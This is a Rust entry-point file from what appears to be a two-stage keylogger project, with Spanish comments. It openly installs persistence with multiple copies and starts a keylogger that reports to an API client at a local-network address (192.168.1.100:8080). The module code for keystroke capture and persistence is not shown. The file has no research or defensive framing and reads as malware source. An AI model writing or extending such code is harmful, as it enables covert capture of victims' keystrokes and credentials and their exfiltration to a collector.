// main.rs
mod keylogger;
mod api;
mod persistence;
mod crypto;

use api::ApiClient;
use std::sync::Arc;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔐 Stage 2 - Keylogger iniciado");

    // 1. INSTALAR PERSISTENCIA CON COPIA MÚLTIPLE
    println!("📌 Llamando a persistence::install()...");
    match persistence::install() {
        Ok(_) => println!("✅ persistence::install() completado correctamente"),
        Err(e) => println!("❌ persistence::install() falló: {}", e),
    }

    // 2. Iniciar keylogger
    let api_client = Arc::new(ApiClient::new("http://192.168.1.100:8080"));
    println!("⌨️  Keylogger activo - presiona teclas");

    keylogger::start(api_client)?;

    Ok(())
}
